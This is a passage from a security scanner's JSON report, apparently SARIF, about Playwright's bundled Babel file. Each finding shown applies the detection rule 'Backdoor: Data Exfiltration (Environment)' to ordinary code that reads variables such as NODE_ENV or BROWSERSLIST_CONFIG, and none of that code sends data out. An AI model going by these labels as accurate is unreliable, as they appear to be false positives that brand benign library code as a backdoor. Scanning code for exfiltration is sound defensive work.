                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1971,
                  "startColumn": 42,
                  "endLine": 1971,
                  "endColumn": 53,
                  "snippet": {
                    "text": "  // .cache(fn) will perform a linear search though instances to find the matching plugin based\n  // based on previous instantiated plugins. If you want to recreate the plugin and discard the\n  // previous instance whenever something changes, you may use:\n  var isProd = api.cache.invalidate(() => process.env.NODE_ENV === \"production\");\n\n  // Note, we also expose the following more-verbose versions of the above examples:\n  api.cache.forever(); // api.cache(true)\n",
                    "rendered": {
                      "text": "  // .cache(fn) will perform a linear search though instances to find the matching plugin based\n  // based on previous instantiated plugins. If you want to recreate the plugin and discard the\n  // previous instance whenever something changes, you may use:\n  var isProd = api.cache.invalidate(() => process.env.NODE_ENV === \"production\");\n\n  // Note, we also expose the following more-verbose versions of the above examples:\n  api.cache.forever(); // api.cache(true)\n",
                      "markdown": "`  // .cache(fn) will perform a linear search though instances to find the matching plugin based\n  // based on previous instantiated plugins. If you want to recreate the plugin and discard the\n  // previous instance whenever something changes, you may use:\n  var isProd = api.cache.invalidate(() => process.env.NODE_ENV === \"production\");\n\n  // Note, we also expose the following more-verbose versions of the above examples:\n  api.cache.forever(); // api.cache(true)\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1966,
                  "startColumn": 31,
                  "endLine": 1966,
                  "endColumn": 42,
                  "snippet": {
                    "text": "\n  // If testing for a specific env, we recommend specifics to avoid instantiating a plugin for\n  // any possible NODE_ENV value that might come up during plugin execution.\n  var isProd = api.cache(() => process.env.NODE_ENV === \"production\");\n\n  // .cache(fn) will perform a linear search though instances to find the matching plugin based\n  // based on previous instantiated plugins. If you want to recreate the plugin and discard the\n",
                    "rendered": {
                      "text": "\n  // If testing for a specific env, we recommend specifics to avoid instantiating a plugin for\n  // any possible NODE_ENV value that might come up during plugin execution.\n  var isProd = api.cache(() => process.env.NODE_ENV === \"production\");\n\n  // .cache(fn) will perform a linear search though instances to find the matching plugin based\n  // based on previous instantiated plugins. If you want to recreate the plugin and discard the\n",
                      "markdown": "`\n  // If testing for a specific env, we recommend specifics to avoid instantiating a plugin for\n  // any possible NODE_ENV value that might come up during plugin execution.\n  var isProd = api.cache(() => process.env.NODE_ENV === \"production\");\n\n  // .cache(fn) will perform a linear search though instances to find the matching plugin based\n  // based on previous instantiated plugins. If you want to recreate the plugin and discard the\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1962,
                  "startColumn": 28,
                  "endLine": 1962,
                  "endColumn": 39,
                  "snippet": {
                    "text": "\n  // Cached based on the value of some function. If this function returns a value different from\n  // a previously-encountered value, the plugins will re-evaluate.\n  var env = api.cache(() => process.env.NODE_ENV);\n\n  // If testing for a specific env, we recommend specifics to avoid instantiating a plugin for\n  // any possible NODE_ENV value that might come up during plugin execution.\n",
                    "rendered": {
                      "text": "\n  // Cached based on the value of some function. If this function returns a value different from\n  // a previously-encountered value, the plugins will re-evaluate.\n  var env = api.cache(() => process.env.NODE_ENV);\n\n  // If testing for a specific env, we recommend specifics to avoid instantiating a plugin for\n  // any possible NODE_ENV value that might come up during plugin execution.\n",
                      "markdown": "`\n  // Cached based on the value of some function. If this function returns a value different from\n  // a previously-encountered value, the plugins will re-evaluate.\n  var env = api.cache(() => process.env.NODE_ENV);\n\n  // If testing for a specific env, we recommend specifics to avoid instantiating a plugin for\n  // any possible NODE_ENV value that might come up during plugin execution.\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1948,
                  "startColumn": 748,
                  "endLine": 1948,
                  "endColumn": 759,
                  "snippet": {
                    "text": "eld*U_(s,r,n);if(!i)throw new un.default(\"Config file contains no configuration data\",s);return c1(\"Loaded config %o from %o.\",e,t),i}function U_(e,t,r){switch(Nr().extname(e)){case\".js\":case\".cjs\":case\".mjs\":case\".cts\":return Y1e(e,{envName:t,caller:r});default:return z1e(e)}}function*nve(e){let t=process.env.BABEL_SHOW_CONFIG_FOR;if(t!=null){let r=Nr().resolve(e,t);if(!(yield*$1e.stat(r)).isFile())throw new Error(`${r}: BABEL_SHOW_CONFIG_FOR must refer to a regular file, directories are not supported.`);return r}return null}function sve(e){throw new un.default(`Caching was left unconfigured. Babel's pl",
                    "rendered": {
                      "text": "eld*U_(s,r,n);if(!i)throw new un.default(\"Config file contains no configuration data\",s);return c1(\"Loaded config %o from %o.\",e,t),i}function U_(e,t,r){switch(Nr().extname(e)){case\".js\":case\".cjs\":case\".mjs\":case\".cts\":return Y1e(e,{envName:t,caller:r});default:return z1e(e)}}function*nve(e){let t=process.env.BABEL_SHOW_CONFIG_FOR;if(t!=null){let r=Nr().resolve(e,t);if(!(yield*$1e.stat(r)).isFile())throw new Error(`${r}: BABEL_SHOW_CONFIG_FOR must refer to a regular file, directories are not supported.`);return r}return null}function sve(e){throw new un.default(`Caching was left unconfigured. Babel's pl",
                      "markdown": "`eld*U_(s,r,n);if(!i)throw new un.default(\"Config file contains no configuration data\",s);return c1(\"Loaded config %o from %o.\",e,t),i}function U_(e,t,r){switch(Nr().extname(e)){case\".js\":case\".cjs\":case\".mjs\":case\".cts\":return Y1e(e,{envName:t,caller:r});default:return z1e(e)}}function*nve(e){let t=process.env.BABEL_SHOW_CONFIG_FOR;if(t!=null){let r=Nr().resolve(e,t);if(!(yield*$1e.stat(r)).isFile())throw new Error(`${r}: BABEL_SHOW_CONFIG_FOR must refer to a regular file, directories are not supported.`);return r}return null}function sve(e){throw new un.default(`Caching was left unconfigured. Babel's pl`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1747,
                  "startColumn": 3455,
                  "endLine": 1747,
                  "endColumn": 3466,
                  "snippet": {
                    "text": ":\"option\",name:r,parent:t},e[r]);else{let s=new Error(`.${r} is not a valid Plugin property`);throw s.code=\"BABEL_UNKNOWN_PLUGIN_PROPERTY\",s}}),e}});var wb=E(Cb=>{\"use strict\";Object.defineProperty(Cb,\"__esModule\",{value:!0});Cb.getEnv=f0e;function f0e(e=\"development\"){return process.env.BABEL_ENV||process.env.NODE_ENV||e}});var Db=E(_f=>{\"use strict\";Object.defineProperty(_f,\"__esModule\",{value:!0});_f.default=II;_f.loadPartialConfig=T0e;function Df(){let e=require(\"path\");return Df=function(){return e},e}var p0e=zc(),d0e=Lc(),DI=sl(),h0e=Pb(),m0e=wb(),y0e=ll(),If=il(),g0e=tb(),b0e=[\"showIgnoredFiles\"];",
                    "rendered": {
                      "text": ":\"option\",name:r,parent:t},e[r]);else{let s=new Error(`.${r} is not a valid Plugin property`);throw s.code=\"BABEL_UNKNOWN_PLUGIN_PROPERTY\",s}}),e}});var wb=E(Cb=>{\"use strict\";Object.defineProperty(Cb,\"__esModule\",{value:!0});Cb.getEnv=f0e;function f0e(e=\"development\"){return process.env.BABEL_ENV||process.env.NODE_ENV||e}});var Db=E(_f=>{\"use strict\";Object.defineProperty(_f,\"__esModule\",{value:!0});_f.default=II;_f.loadPartialConfig=T0e;function Df(){let e=require(\"path\");return Df=function(){return e},e}var p0e=zc(),d0e=Lc(),DI=sl(),h0e=Pb(),m0e=wb(),y0e=ll(),If=il(),g0e=tb(),b0e=[\"showIgnoredFiles\"];",
                      "markdown": "`:\"option\",name:r,parent:t},e[r]);else{let s=new Error(`.${r} is not a valid Plugin property`);throw s.code=\"BABEL_UNKNOWN_PLUGIN_PROPERTY\",s}}),e}});var wb=E(Cb=>{\"use strict\";Object.defineProperty(Cb,\"__esModule\",{value:!0});Cb.getEnv=f0e;function f0e(e=\"development\"){return process.env.BABEL_ENV||process.env.NODE_ENV||e}});var Db=E(_f=>{\"use strict\";Object.defineProperty(_f,\"__esModule\",{value:!0});_f.default=II;_f.loadPartialConfig=T0e;function Df(){let e=require(\"path\");return Df=function(){return e},e}var p0e=zc(),d0e=Lc(),DI=sl(),h0e=Pb(),m0e=wb(),y0e=ll(),If=il(),g0e=tb(),b0e=[\"showIgnoredFiles\"];`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1747,
                  "startColumn": 3432,
                  "endLine": 1747,
                  "endColumn": 3443,
                  "snippet": {
                    "text": "t n=o0e[r];if(n)n({type:\"option\",name:r,parent:t},e[r]);else{let s=new Error(`.${r} is not a valid Plugin property`);throw s.code=\"BABEL_UNKNOWN_PLUGIN_PROPERTY\",s}}),e}});var wb=E(Cb=>{\"use strict\";Object.defineProperty(Cb,\"__esModule\",{value:!0});Cb.getEnv=f0e;function f0e(e=\"development\"){return process.env.BABEL_ENV||process.env.NODE_ENV||e}});var Db=E(_f=>{\"use strict\";Object.defineProperty(_f,\"__esModule\",{value:!0});_f.default=II;_f.loadPartialConfig=T0e;function Df(){let e=require(\"path\");return Df=function(){return e},e}var p0e=zc(),d0e=Lc(),DI=sl(),h0e=Pb(),m0e=wb(),y0e=ll(),If=il(),g0e=tb(),b0",
                    "rendered": {
                      "text": "t n=o0e[r];if(n)n({type:\"option\",name:r,parent:t},e[r]);else{let s=new Error(`.${r} is not a valid Plugin property`);throw s.code=\"BABEL_UNKNOWN_PLUGIN_PROPERTY\",s}}),e}});var wb=E(Cb=>{\"use strict\";Object.defineProperty(Cb,\"__esModule\",{value:!0});Cb.getEnv=f0e;function f0e(e=\"development\"){return process.env.BABEL_ENV||process.env.NODE_ENV||e}});var Db=E(_f=>{\"use strict\";Object.defineProperty(_f,\"__esModule\",{value:!0});_f.default=II;_f.loadPartialConfig=T0e;function Df(){let e=require(\"path\");return Df=function(){return e},e}var p0e=zc(),d0e=Lc(),DI=sl(),h0e=Pb(),m0e=wb(),y0e=ll(),If=il(),g0e=tb(),b0",
                      "markdown": "`t n=o0e[r];if(n)n({type:\"option\",name:r,parent:t},e[r]);else{let s=new Error(`.${r} is not a valid Plugin property`);throw s.code=\"BABEL_UNKNOWN_PLUGIN_PROPERTY\",s}}),e}});var wb=E(Cb=>{\"use strict\";Object.defineProperty(Cb,\"__esModule\",{value:!0});Cb.getEnv=f0e;function f0e(e=\"development\"){return process.env.BABEL_ENV||process.env.NODE_ENV||e}});var Db=E(_f=>{\"use strict\";Object.defineProperty(_f,\"__esModule\",{value:!0});_f.default=II;_f.loadPartialConfig=T0e;function Df(){let e=require(\"path\");return Df=function(){return e},e}var p0e=zc(),d0e=Lc(),DI=sl(),h0e=Pb(),m0e=wb(),y0e=ll(),If=il(),g0e=tb(),b0`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1725,
                  "startColumn": 151,
                  "endLine": 1725,
                  "endColumn": 162,
                  "snippet": {
                    "text": "TA)){var r=Xhe(t),n=Date.now()-Hhe;r!==0&&r<n&&console.warn(`Browserslist: caniuse-lite is outdated. Please run:\n  npx update-browserslist-db@latest\n  Why you should do it regularly: https://github.com/browserslist/update-db#readme`)}},currentNode:function(){return\"node \"+process.versions.node},env:process.env}});var oD=E((aDe,aD)=>{var zhe=aw(),Kn=bw().agents,jg=Ew(),lf=require(\"path\"),nn=Tw(),xr=_g(),Qw=ww(),sr=$w(),Qhe=365.259641*24*60*60*1e3,Zw=\"37\",Zhe=14;function eD(e,t){return(e+\".\").indexOf(t+\".\")===0}function eme(e){var t=e.slice(1);return Ee.nodeVersions.some(function(r){return eD(r,t)})}functi",
                    "rendered": {
                      "text": "TA)){var r=Xhe(t),n=Date.now()-Hhe;r!==0&&r<n&&console.warn(`Browserslist: caniuse-lite is outdated. Please run:\n  npx update-browserslist-db@latest\n  Why you should do it regularly: https://github.com/browserslist/update-db#readme`)}},currentNode:function(){return\"node \"+process.versions.node},env:process.env}});var oD=E((aDe,aD)=>{var zhe=aw(),Kn=bw().agents,jg=Ew(),lf=require(\"path\"),nn=Tw(),xr=_g(),Qw=ww(),sr=$w(),Qhe=365.259641*24*60*60*1e3,Zw=\"37\",Zhe=14;function eD(e,t){return(e+\".\").indexOf(t+\".\")===0}function eme(e){var t=e.slice(1);return Ee.nodeVersions.some(function(r){return eD(r,t)})}functi",
                      "markdown": "`TA)){var r=Xhe(t),n=Date.now()-Hhe;r!==0&&r<n&&console.warn(`Browserslist: caniuse-lite is outdated. Please run:\n  npx update-browserslist-db@latest\n  Why you should do it regularly: https://github.com/browserslist/update-db#readme`)}},currentNode:function(){return\"node \"+process.versions.node},env:process.env}});var oD=E((aDe,aD)=>{var zhe=aw(),Kn=bw().agents,jg=Ew(),lf=require(\"path\"),nn=Tw(),xr=_g(),Qw=ww(),sr=$w(),Qhe=365.259641*24*60*60*1e3,Zw=\"37\",Zhe=14;function eD(e,t){return(e+\".\").indexOf(t+\".\")===0}function eme(e){var t=e.slice(1);return Ee.nodeVersions.some(function(r){return eD(r,t)})}functi`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 62003,
                  "endLine": 1723,
                  "endColumn": 62014,
                  "snippet": {
                    "text": "tains both .browserslistrc and browserslist\");return Tn(i)?yi.exports.readConfig(i):Tn(o)?yi.exports.readConfig(o):l});return process.env.BROWSERSLIST_DISABLE_CACHE||r.forEach(function(s){Zc[s]=n}),n},clearCaches:function(){Fg=!1,tf={},Zc={},this.cache={}},oldDataWarning:function(t){if(!Fg&&(Fg=!0,!process.env.BROWSERSLIST_IGNORE_OLD_DATA)){var r=Xhe(t),n=Date.now()-Hhe;r!==0&&r<n&&console.warn(`Browserslist: caniuse-lite is outdated. Please run:\n  npx update-browserslist-db@latest\n  Why you should do it regularly: https://github.com/browserslist/update-db#readme`)}},currentNode:function(){return\"node \"+",
                    "rendered": {
                      "text": "tains both .browserslistrc and browserslist\");return Tn(i)?yi.exports.readConfig(i):Tn(o)?yi.exports.readConfig(o):l});return process.env.BROWSERSLIST_DISABLE_CACHE||r.forEach(function(s){Zc[s]=n}),n},clearCaches:function(){Fg=!1,tf={},Zc={},this.cache={}},oldDataWarning:function(t){if(!Fg&&(Fg=!0,!process.env.BROWSERSLIST_IGNORE_OLD_DATA)){var r=Xhe(t),n=Date.now()-Hhe;r!==0&&r<n&&console.warn(`Browserslist: caniuse-lite is outdated. Please run:\n  npx update-browserslist-db@latest\n  Why you should do it regularly: https://github.com/browserslist/update-db#readme`)}},currentNode:function(){return\"node \"+",
                      "markdown": "`tains both .browserslistrc and browserslist\");return Tn(i)?yi.exports.readConfig(i):Tn(o)?yi.exports.readConfig(o):l});return process.env.BROWSERSLIST_DISABLE_CACHE||r.forEach(function(s){Zc[s]=n}),n},clearCaches:function(){Fg=!1,tf={},Zc={},this.cache={}},oldDataWarning:function(t){if(!Fg&&(Fg=!0,!process.env.BROWSERSLIST_IGNORE_OLD_DATA)){var r=Xhe(t),n=Date.now()-Hhe;r!==0&&r<n&&console.warn(`Browserslist: caniuse-lite is outdated. Please run:\n  npx update-browserslist-db@latest\n  Why you should do it regularly: https://github.com/browserslist/update-db#readme`)}},currentNode:function(){return\"node \"+`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 61829,
                  "endLine": 1723,
                  "endColumn": 61840,
                  "snippet": {
                    "text": "browserslist and package.json with browsers\");if(Tn(o)&&l)throw new nr(s+\" contains both .browserslistrc and package.json with browsers\");if(Tn(i)&&Tn(o))throw new nr(s+\" contains both .browserslistrc and browserslist\");return Tn(i)?yi.exports.readConfig(i):Tn(o)?yi.exports.readConfig(o):l});return process.env.BROWSERSLIST_DISABLE_CACHE||r.forEach(function(s){Zc[s]=n}),n},clearCaches:function(){Fg=!1,tf={},Zc={},this.cache={}},oldDataWarning:function(t){if(!Fg&&(Fg=!0,!process.env.BROWSERSLIST_IGNORE_OLD_DATA)){var r=Xhe(t),n=Date.now()-Hhe;r!==0&&r<n&&console.warn(`Browserslist: caniuse-lite is outdated",
                    "rendered": {
                      "text": "browserslist and package.json with browsers\");if(Tn(o)&&l)throw new nr(s+\" contains both .browserslistrc and package.json with browsers\");if(Tn(i)&&Tn(o))throw new nr(s+\" contains both .browserslistrc and browserslist\");return Tn(i)?yi.exports.readConfig(i):Tn(o)?yi.exports.readConfig(o):l});return process.env.BROWSERSLIST_DISABLE_CACHE||r.forEach(function(s){Zc[s]=n}),n},clearCaches:function(){Fg=!1,tf={},Zc={},this.cache={}},oldDataWarning:function(t){if(!Fg&&(Fg=!0,!process.env.BROWSERSLIST_IGNORE_OLD_DATA)){var r=Xhe(t),n=Date.now()-Hhe;r!==0&&r<n&&console.warn(`Browserslist: caniuse-lite is outdated",
                      "markdown": "`browserslist and package.json with browsers\");if(Tn(o)&&l)throw new nr(s+\" contains both .browserslistrc and package.json with browsers\");if(Tn(i)&&Tn(o))throw new nr(s+\" contains both .browserslistrc and browserslist\");return Tn(i)?yi.exports.readConfig(i):Tn(o)?yi.exports.readConfig(o):l});return process.env.BROWSERSLIST_DISABLE_CACHE||r.forEach(function(s){Zc[s]=n}),n},clearCaches:function(){Fg=!1,tf={},Zc={},this.cache={}},oldDataWarning:function(t){if(!Fg&&(Fg=!0,!process.env.BROWSERSLIST_IGNORE_OLD_DATA)){var r=Xhe(t),n=Date.now()-Hhe;r!==0&&r<n&&console.warn(`Browserslist: caniuse-lite is outdated`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 59925,
                  "endLine": 1723,
                  "endColumn": 59936,
                  "snippet": {
                    "text": "serslist-stats.json\");return Tn(i)?i:void 0})),typeof n==\"string\")try{n=JSON.parse(da.readFileSync(n))}catch{throw new nr(\"Can't read \"+n)}return Vw(r,n)},loadConfig:function(t){if(process.env.BROWSERSLIST)return process.env.BROWSERSLIST;if(t.config||process.env.BROWSERSLIST_CONFIG){var r=t.config||process.env.BROWSERSLIST_CONFIG;return rn.basename(r)===\"package.json\"?ef(Uw(r),t):ef(yi.exports.readConfig(r),t)}else return t.path?ef(yi.exports.findConfig(t.path),t):void 0},loadCountry:function(t,r,n){var s=r.replace(/[^\\w-]/g,\"\");if(!t[s]){var i;try{i=require(\"caniuse-lite/data/regions/\"+s+\".js\")}catch{th",
                    "rendered": {
                      "text": "serslist-stats.json\");return Tn(i)?i:void 0})),typeof n==\"string\")try{n=JSON.parse(da.readFileSync(n))}catch{throw new nr(\"Can't read \"+n)}return Vw(r,n)},loadConfig:function(t){if(process.env.BROWSERSLIST)return process.env.BROWSERSLIST;if(t.config||process.env.BROWSERSLIST_CONFIG){var r=t.config||process.env.BROWSERSLIST_CONFIG;return rn.basename(r)===\"package.json\"?ef(Uw(r),t):ef(yi.exports.readConfig(r),t)}else return t.path?ef(yi.exports.findConfig(t.path),t):void 0},loadCountry:function(t,r,n){var s=r.replace(/[^\\w-]/g,\"\");if(!t[s]){var i;try{i=require(\"caniuse-lite/data/regions/\"+s+\".js\")}catch{th",
                      "markdown": "`serslist-stats.json\");return Tn(i)?i:void 0})),typeof n==\"string\")try{n=JSON.parse(da.readFileSync(n))}catch{throw new nr(\"Can't read \"+n)}return Vw(r,n)},loadConfig:function(t){if(process.env.BROWSERSLIST)return process.env.BROWSERSLIST;if(t.config||process.env.BROWSERSLIST_CONFIG){var r=t.config||process.env.BROWSERSLIST_CONFIG;return rn.basename(r)===\"package.json\"?ef(Uw(r),t):ef(yi.exports.readConfig(r),t)}else return t.path?ef(yi.exports.findConfig(t.path),t):void 0},loadCountry:function(t,r,n){var s=r.replace(/[^\\w-]/g,\"\");if(!t[s]){var i;try{i=require(\"caniuse-lite/data/regions/\"+s+\".js\")}catch{th`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 59876,
                  "endLine": 1723,
                  "endColumn": 59887,
                  "snippet": {
                    "text": "c&&(n=qw(t.path,function(s){var i=rn.join(s,\"browserslist-stats.json\");return Tn(i)?i:void 0})),typeof n==\"string\")try{n=JSON.parse(da.readFileSync(n))}catch{throw new nr(\"Can't read \"+n)}return Vw(r,n)},loadConfig:function(t){if(process.env.BROWSERSLIST)return process.env.BROWSERSLIST;if(t.config||process.env.BROWSERSLIST_CONFIG){var r=t.config||process.env.BROWSERSLIST_CONFIG;return rn.basename(r)===\"package.json\"?ef(Uw(r),t):ef(yi.exports.readConfig(r),t)}else return t.path?ef(yi.exports.findConfig(t.path),t):void 0},loadCountry:function(t,r,n){var s=r.replace(/[^\\w-]/g,\"\");if(!t[s]){var i;try{i=requi",
                    "rendered": {
                      "text": "c&&(n=qw(t.path,function(s){var i=rn.join(s,\"browserslist-stats.json\");return Tn(i)?i:void 0})),typeof n==\"string\")try{n=JSON.parse(da.readFileSync(n))}catch{throw new nr(\"Can't read \"+n)}return Vw(r,n)},loadConfig:function(t){if(process.env.BROWSERSLIST)return process.env.BROWSERSLIST;if(t.config||process.env.BROWSERSLIST_CONFIG){var r=t.config||process.env.BROWSERSLIST_CONFIG;return rn.basename(r)===\"package.json\"?ef(Uw(r),t):ef(yi.exports.readConfig(r),t)}else return t.path?ef(yi.exports.findConfig(t.path),t):void 0},loadCountry:function(t,r,n){var s=r.replace(/[^\\w-]/g,\"\");if(!t[s]){var i;try{i=requi",
                      "markdown": "`c&&(n=qw(t.path,function(s){var i=rn.join(s,\"browserslist-stats.json\");return Tn(i)?i:void 0})),typeof n==\"string\")try{n=JSON.parse(da.readFileSync(n))}catch{throw new nr(\"Can't read \"+n)}return Vw(r,n)},loadConfig:function(t){if(process.env.BROWSERSLIST)return process.env.BROWSERSLIST;if(t.config||process.env.BROWSERSLIST_CONFIG){var r=t.config||process.env.BROWSERSLIST_CONFIG;return rn.basename(r)===\"package.json\"?ef(Uw(r),t):ef(yi.exports.readConfig(r),t)}else return t.path?ef(yi.exports.findConfig(t.path),t):void 0},loadCountry:function(t,r,n){var s=r.replace(/[^\\w-]/g,\"\");if(!t[s]){var i;try{i=requi`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 59838,
                  "endLine": 1723,
                  "endColumn": 59849,
                  "snippet": {
                    "text": "STATS:t.path&&rn.resolve&&da.existsSync&&(n=qw(t.path,function(s){var i=rn.join(s,\"browserslist-stats.json\");return Tn(i)?i:void 0})),typeof n==\"string\")try{n=JSON.parse(da.readFileSync(n))}catch{throw new nr(\"Can't read \"+n)}return Vw(r,n)},loadConfig:function(t){if(process.env.BROWSERSLIST)return process.env.BROWSERSLIST;if(t.config||process.env.BROWSERSLIST_CONFIG){var r=t.config||process.env.BROWSERSLIST_CONFIG;return rn.basename(r)===\"package.json\"?ef(Uw(r),t):ef(yi.exports.readConfig(r),t)}else return t.path?ef(yi.exports.findConfig(t.path),t):void 0},loadCountry:function(t,r,n){var s=r.replace(/[^",
                    "rendered": {
                      "text": "STATS:t.path&&rn.resolve&&da.existsSync&&(n=qw(t.path,function(s){var i=rn.join(s,\"browserslist-stats.json\");return Tn(i)?i:void 0})),typeof n==\"string\")try{n=JSON.parse(da.readFileSync(n))}catch{throw new nr(\"Can't read \"+n)}return Vw(r,n)},loadConfig:function(t){if(process.env.BROWSERSLIST)return process.env.BROWSERSLIST;if(t.config||process.env.BROWSERSLIST_CONFIG){var r=t.config||process.env.BROWSERSLIST_CONFIG;return rn.basename(r)===\"package.json\"?ef(Uw(r),t):ef(yi.exports.readConfig(r),t)}else return t.path?ef(yi.exports.findConfig(t.path),t):void 0},loadCountry:function(t,r,n){var s=r.replace(/[^",
                      "markdown": "`STATS:t.path&&rn.resolve&&da.existsSync&&(n=qw(t.path,function(s){var i=rn.join(s,\"browserslist-stats.json\");return Tn(i)?i:void 0})),typeof n==\"string\")try{n=JSON.parse(da.readFileSync(n))}catch{throw new nr(\"Can't read \"+n)}return Vw(r,n)},loadConfig:function(t){if(process.env.BROWSERSLIST)return process.env.BROWSERSLIST;if(t.config||process.env.BROWSERSLIST_CONFIG){var r=t.config||process.env.BROWSERSLIST_CONFIG;return rn.basename(r)===\"package.json\"?ef(Uw(r),t):ef(yi.exports.readConfig(r),t)}else return t.path?ef(yi.exports.findConfig(t.path),t):void 0},loadCountry:function(t,r,n){var s=r.replace(/[^`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/babelBundleImpl.js"
                },
                "region": {
                  "startLine": 1723,
                  "startColumn": 59806,
                  "endLine": 1723,
                  "endColumn": 59817,
                  "snippet": {
